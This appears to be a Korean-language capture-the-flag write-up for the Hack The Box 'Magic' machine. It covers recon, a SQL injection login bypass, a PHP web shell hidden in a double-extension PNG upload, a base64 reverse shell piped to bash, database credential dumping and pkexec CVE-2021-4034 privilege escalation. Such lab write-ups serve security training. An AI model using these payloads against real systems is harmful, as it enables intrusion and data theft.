# HTB-MAGIC
```bash
OS: Linux
DATE: 26.10.22
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 포트 검사, UDP 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 22,80 IP | tee nmap
```
```bash
sudo nmap -sUV --top-ports 100 IP
```

확인 결과 http 서비스가 운행 중인 것을 알게 되어 접속하였고, 접속 후 웹 디렉토리와 서브도메인 fuzzing을 진행하였다
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://magic.htb -H "Host: FUZZ.magic.htb" -fs 4000-4100
```
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```

그 결과 `login.php`를 발견할 수 있었다.

## Initial Access
FUZZING 결과 숨겨진 페이지는 발견하지 못하였고 평범한 login 페이지만 발견할 수 있었다. 먼저 기본 크레덴셜인 `admin/admin`을 시도하였지만 실패하였다. 따라서 SQL Injection 취약점이 있는지 확인해보았다.

확인 결과 그냥 실패했을 때는 **Wrong Username or Password**라는 alert가 뜬다. 하지만 username 폼에 `'`를 붙이고 아무거나 입력해도 틀리다는 문구가 뜨지 않아 burp로 캡쳐를 해보았다.

![burp1](attach_real/Pasted%20image%2020261024015610.png)

![burp2](attach_real/Pasted%20image%2020261024015627.png)

확인 결과 내가 생각했던 것처럼 `'` 문자를 넣으면 문자가 깨졌다. 따라서 데이터 추출보다 인증 우회를 시도하였다. `' OR 1=1-- -`를 시도한 결과 인증 우회에 성공하였다.

따라서 페이지에 들어간 결과 업로드를 할 수 있는 `upload.php`로 리다이렉션이 되었다. 확인 결과 php나 다른 파일들은 업로드가 막혀있고 사진 파일만 업로드가 가능한 것 같았다. 따라서 `php.png` 파일을 만들어 주었다. 먼저 `image.png`를 다운로드 받아주고 `shell.php.png`라는 이름으로 이중 확장자를 만들어주었다.
```bash
cp image.png shell.php.png
```

이후 `shell.php.png` 안에 웹쉘 내용을 추가해주었다.
```bash
echo '<?php system($_GET["c"]); ?>' >> shell.php.png
```

이후 이것을 업로드해주었다. 업로드한 결과 성공하였다. 따라서 업로드된 위치를 확인해본 결과 `/images/uploads/` 위치에 업로드된 것을 알게 되었다. 따라서 curl로 올린 웹쉘이 되는지 확인해보았다.
```bash
curl "http://IP/images/uploads/shell.php.png?c=id"
```

그 결과 output으로 뽑아야 한다는 나와서 `-` 하이픈으로 파일 말고 화면에 출력하라는 명령을 해주어 확인해주었다.
```bash
curl "http://IP/images/uploads/shell.php.png?c=id" --output -
�t�Q▒IEND�B`�uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

웹쉘이 된다는 것을 확인하였다. 따라서 리버스쉘 코드를 base64로 인코딩 해주고 웹쉘을 사용해보았다.
```bash
curl "http://IP/images/uploads/shell.php.png" -G --data-urlencode "c=echo {BASE64값} | base64 -d | bash"
```

명령을 사용하여 쉘을 얻게 되었다.
```bash
rlwrap nc -nlvp 4444
$
```

따라서 www-data 쉘을 얻는 것을 성공하였다. 쉘을 얻고 DB나 다른 파일이 있는지 확인해본 결과 `/var/www/Magic/db.php5` 파일이 있는 것을 확인할 수 있었고 확인해보았다.
```php5
<?php
class Database
{
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
}
```

확인 결과 DB 자격증명을 알 수 있었다. 따라서 mysql 명령어를 사용하여 DB 열거를 진행하려 했다.
```bash
mysql -h localhost -u theseus -p iamkingtheseus
```

하지만 없는 명령어라고 떴다. 따라서 대체할 수 있는 명령어가 있는지 찾아보았다. 찾아본 결과 `mysqldump` 라는 명령어가 대체할 수 있다는 것을 알게 되었다. mysql은 없어도 mysqldump는 깔려있는 경우가 많다고 했다. 이 tool은 DB를 통째로 덤프하는 도구로 한번 있는지 확인 결과 있다고 나와 dump를 진행하였다.
```sql
mysqldump --databases Magic -u theseus -piamkingtheseus
--
LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```

그 결과 admin의 패스워드처럼 보이는 것이 나왔다. 따라서 ssh로 `theseus` 라는 유저로 접속을 시도하였다.
```bash
ssh theseus@IP
arning: Permanently added '10.129.87.93' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
theseus@IP: Permission denied (publickey).
```

확인 결과 ssh key로만 접속할 수 있다 하여 쉘 안에서 유저를 바꿀 수 있는 `su` 명령어를 사용하여 접속해보았다.
```bash
su theseus
```

그 결과 유저 쉘을 얻을 수 있었다. 이후 ssh 백도어를 심어준 후 더 편하게 접근할 수 있게 만들어주었다.

![user](attach_real/Pasted%20image%2020261023233715.png)

## Privilege Escalation
이후 `sudo -l` 등을 확인해보았다. 확인 결과 SUID를 확인할 수 있는 명령어를 사용해보았다.
```bash
find -type f -perm -04000 -ls 2>/dev/null
/usr/bin/pkexec
```

확인 결과 `/usr/bin/pkexec` 프로그램 특정 버전이 취약하다는 것을 알기에 [참고](https://github.com/mebeim/CVE-2021-4034) 자료를 보고 확인해보았다.
```bash
uname -a
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
```bash
lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
```
```bash
apt-cache policy policykit-1
policykit-1:
Installed: 0.105-20ubuntu0.18.04.5
Candidate: 0.105-20ubuntu0.18.04.5
```

확인 결과 **CVE-2021-4034** 취약점에 모든 것이 맞는다는 것을 알게 되었다. 따라서 PoC를 실행하려면 쉘 안에 make, gcc 등 필요한 프로그램들이 있는지 확인 결과 다 있어서 PoC를 실행해주었다.
```bash
./exploit.sh
#
```

그 결과 root 쉘을 얻을 수 있게 되었다.

![root](attach_real/Pasted%20image%2020261024002935.png)

## New Inform
- burpsuite에서 `ctrl + U` 로 인코딩 할 수 있다
- 버프에서 굳이 인코딩을 하지 않아도 알아서 한다
- SQLI에는 두 가지가 있다: 인증 우회(auth bypass), 데이터 추출(Data Extraction). 따라서 SQLI 위치를 잘 보고 실행해야 한다
- 로그인에서는 인증 우회 SQLI를 실행한다
- 이중 확장을 만들 때 잘 확인하자. `png.php`로 올리면 우회되지 않을 수 있음. **php.png** 확장자를 잘 사용하자
- 업로드는 바로 리버스쉘을 노리지 말고 웹쉘을 이용하자
- 웹쉘을 올리고 무조건 curl을 사용하여 확인하자
- 업로드 되고 업로드가 된 곳을 찾아보자
- curl에 옵션 중에 `--output`을 사용할 때 `-`(하이픈)을 사용하여 파일로 뽑지 말고 화면에 출력해보자
- `-G` 를 사용하여 데이터를 URL 뒤에 `?`로 붙여서 GET으로 보내라는 옵션이다
- `--data-urlencode "c=id"` 이 옵션은 뒤에 내용을 url 인코딩 해주는 내용이다
- 웹쉘을 올리고 리버스쉘을 원하면 base64로 인코딩 해준 후 하자
- mysql 도구가 없을 수도 있다. 만약에 없다면 `mysqldump` 라는 도구는 있을 수 있다. 무조건 확인해주자
- SSH에서 서버가 공개키 인증만 허용할 수 있다. 따라서 `su`를 통해 쉘에서 유저를 바꿀 수 있다
- polkit 취약점은 Ubuntu 18.04에 돌아간다
- 그냥 `./exploit.sh` 해도 거기 안에서 다 컴파일하고 할 수 있다
